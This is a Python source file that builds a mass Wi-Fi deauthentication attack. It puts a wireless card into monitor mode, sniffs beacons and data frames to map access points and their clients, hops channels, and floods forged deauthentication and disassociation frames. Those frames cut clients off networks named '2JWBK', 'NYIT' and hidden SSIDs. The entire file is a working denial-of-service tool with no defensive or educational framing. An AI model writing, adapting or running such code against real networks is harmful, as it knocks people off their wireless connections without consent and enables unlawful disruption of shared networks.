from cffi import FFI, verifier
from scapy.all import *
from gevent.queue import Queue
from gevent.coros import BoundedSemaphore
import time, threading, gevent, re, signal, sys, random

driver_name = 'ath9k_htc'

verifier.cleanup_tmpdir()
ffi = FFI()
ffi.cdef("""
int socket (int __domain, int __type, int __protocol);
int shutdown (int __fd, int __how);
int close(int fd);

struct	iwreq 
{
	union	iwreq_data	u;
    ...;
};

union	iwreq_data
{
	struct iw_freq	freq;
	...;
};

struct	iw_freq
{
	int32_t		m;
	int16_t		e;
	uint8_t		i;
	uint8_t		flags;
};

int iw_get_ext(int			skfd,
	   const char *		ifname,
	   int			request,
	   struct iwreq *	pwrq);
       
int iw_set_ext(int			skfd,
	   const char *		ifname,
	   int			request,
	   struct iwreq *	pwrq);
""")
ccall = ffi.verify("""
#include <sys/socket.h>
#include <iwlib.h>
#include <linux/wireless.h>
""")

def switch_to(channel, iface):
    C = ccall
    AF_INET = 2
    SOCK_DGRAM = 2
    SHUT_RDWR = 2
    SIOCSIWFREQ = 0x8B04
    SIOCGIWFREQ = 0x8B05

    def channel_to_freqency(chan):
        if chan < 0 or chan > 14:
            return 0
        elif chan == 14:
            return 2484
        else:
            return 2407 + chan*5
                
    skfd = C.socket(AF_INET, SOCK_DGRAM, 0)
    assert skfd >= 0
    wrq = ffi.new('struct iwreq *')
    
    result = C.iw_get_ext(skfd, iface, SIOCGIWFREQ, wrq)
    assert result >= 0
    wrq.u.freq.m = channel_to_freqency(int(channel))
    result = C.iw_set_ext(skfd, iface, SIOCSIWFREQ, wrq)
    assert result >= 0
    
    result = C.close(skfd)
    assert result >= 0

                
def get_mon():
    lshw = subprocess.Popen(['lshw', '-class', 'network'], stdout=subprocess.PIPE)
    stdout = lshw.communicate()[0]
    
    iface_name = ''
    for nic in stdout.split('*-network'):
        if driver_name in nic:
            m = re.search(r'logical name: ?(\w+)', nic)
            if m:
                iface_name = m.group(1)
            else:
                print('network card not found!')
                sys.exit(1)
    
    subprocess.call(['ifconfig', iface_name, 'down'])
    p = subprocess.Popen(['airmon-ng', 'start', iface_name], stdout=subprocess.PIPE)
    stdout = p.communicate()[0]
    m = re.search(r'\(monitor mode enabled on (\w+)\)', stdout)
    if m:
        mon_name = m.group(1)
    else:
        print('network card not found!')
        sys.exit(1)
    
    return mon_name

def rm_mon(mon_name):
    subprocess.call(['airmon-ng', 'stop', mon_name])

def sniff_ap(iface, known_networks):
    sniff_count = 100
    sniff_timeout = 0.5
    channels = range(1,13)
    random.shuffle(channels)
    for channel in channels:
        subprocess.call(['iwconfig', iface, 'channel', str(channel)])
        sniff(iface=iface, lfilter=beacon_packet, count=sniff_count, timeout=sniff_timeout, prn=lambda x:add_ap_info(x, network))

def beacon_packet(pckt):
    return (pckt.haslayer(Dot11Beacon) or pckt.haslayer(Dot11ProbeResp))

def add_ap_info(pckt, known_networks):
    bssid = pckt[Dot11].addr3
    if bssid not in known_networks:
        known_networks[bssid] = {}
    if pckt.haslayer(Dot11Elt):
        p = pckt[Dot11Elt]
        while isinstance(p, Dot11Elt):
            if p.ID == 0:
                try:
                    ssid = unicode(p.info, errors='strict')
                    #if ssid not in ('\x00', ''):
                    known_networks[bssid]['ssid'] = ssid
                except UnicodeDecodeError:
                    pass
            elif p.ID == 3:
                try:
                    known_networks[bssid]['channel'] = ord(p.info)
                except TypeError:
                    pass
            p = p.payload

ignore_mac = re.compile(r'(ff:ff:ff:ff:ff:ff)|(01:)|(33:33:)|([0-9a-f][13579bdf]:)')
            
def add_client_info(pckt, known_networks):
    result = get_client_info(pckt)
    if result is None or result[0] is None or result[1] is None:
        return
    elif ignore_mac.match(result[1]):
        return
    bssid, client = result
    if bssid not in known_networks:
        return
    if 'client' not in known_networks[bssid]:
        known_networks[bssid]['client'] = set()
    if client not in known_networks[bssid]['client']:
        known_networks[bssid]['client'].add(client)

def get_client_info(ppckt):
    value = ppckt[Dot11].FCfield & 0x3
    if value ^ 0x2 == 0x0:
        bssid = ppckt[Dot11].addr2
        client = ppckt[Dot11].addr1
    elif value ^ 0x1 == 0x0:
        bssid = ppckt[Dot11].addr1
        client = ppckt[Dot11].addr2
    elif value ^ 0x0 == 0x0:
        bssid = ppckt[Dot11].addr3
        client = ppckt[Dot11].addr2
    else:
        return None
    
    return (bssid, client)

###### Threads #####

def sniff_data(queue, lock, iface):
    sniff_count = 1000
    sniff_timeout = 3
    while True:
        with lock:
            sniff(iface=iface, lfilter=lambda x: (x.haslayer(Dot11) and (x[Dot11].type == 2)), count=sniff_count, timeout=sniff_timeout, prn=lambda x:queue.put(x))
        gevent.sleep(1)

def add_network(queue, known_networks):
    while True:
        add_client_info(queue.get(), known_networks)
        gevent.sleep(0)

mon_channel = None
        
def switch_channel(lock, iface, channels=None):
    if channels is None:
        channels = range(1,13)
    while True:
        random.shuffle(channels)
        for channel in channels:
            with lock:
                print('changing channel to '+str(channel))
                switch_to(channel, iface)
            global mon_channel
            mon_channel = channel
            gevent.sleep(2)

def switch_to_old(channel, iface):
    p = subprocess.call(['iwconfig', iface, 'channel', str(channel)])    
    
def deauth_attack(lock, known_networks, iface):
    deauth_interval = 0.5
    while True:
        for channel in xrange(1, 12):
            global mon_channel
            xchannel = mon_channel
            with lock:
                deauth_clients_on_channel(channel, known_networks, iface)
        gevent.sleep(deauth_interval)
        
def deauth_clients_on_channel(channel, known_networks, iface):
    num_pckt = 64
    if channel is None:
        print('Channel is NONE')
        return
    for bssid in bssid_on_channel(channel, known_networks):
        if 'client' not in known_networks[bssid] or 'ssid' not in known_networks[bssid] or known_networks[bssid]['ssid'] not in ('2JWBK', 'NYIT', '\x00', ''):
            continue
        #print('Attacking BSSID '+bssid)
        for client in known_networks[bssid]['client']:
            #if not client in ('b0:9f:ba:05:c4:a0','0c:3e:9f:0e:b8:43', 'e4:98:d6:20:23:4c'):
            #    continue
            switch_to(channel, iface)
            ap_to_cli_pckt = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
            ap_to_cli_pckt_disas = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Disas(reason=7)
            cli_to_ap_pckt = RadioTap()/Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=client) / Dot11Deauth(reason=7)
            cli_to_ap_pckt_disas = RadioTap()/Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=client) / Dot11Disas(reason=7)
            def sendpckts(x):
                sendp([ap_to_cli_pckt, ap_to_cli_pckt_disas, cli_to_ap_pckt, cli_to_ap_pckt_disas], iface=iface, verbose=False)
            map(sendpckts, range(num_pckt))
            print('Sent ' + str(num_pckt) + ' packets to ' + client)
            
def bssid_on_channel(channel, known_networks):
    bssids = set()
    for bssid in known_networks:
        if 'channel' in known_networks[bssid] and known_networks[bssid]['channel'] == channel:
            bssids.add(bssid)
    return bssids

##### Main #####

def mass_deauth(network, iface):
    sniff_ap(iface, network)
    channels = set()
    for bssid in network:
        if 'channel' in network[bssid] and network[bssid]['channel'] < 13:
            channels.add(network[bssid]['channel'])
    
    q = Queue()
    lock = BoundedSemaphore(1)
    t3 = gevent.spawn(switch_channel, lock, iface, list(channels))
    t1 = gevent.spawn(sniff_data, q, lock, iface)
    t2 = gevent.spawn(add_network, q, network)
    t4 = gevent.spawn(deauth_attack, lock, network, iface)
    ts = [t1, t2, t3, t4]
    gevent.signal(signal.SIGINT, gevent.killall, ts)
    try:
        gevent.joinall(ts, timeout=600)
    except KeyboardInterrupt:
        pass
    finally:
        print('---kill all---')
        gevent.killall(ts)


iface = None
try:
    iface = get_mon()
    network = {}
    mass_deauth(network, iface)
except KeyboardInterrupt:
    pass
finally:
    if iface:
        rm_mon(iface)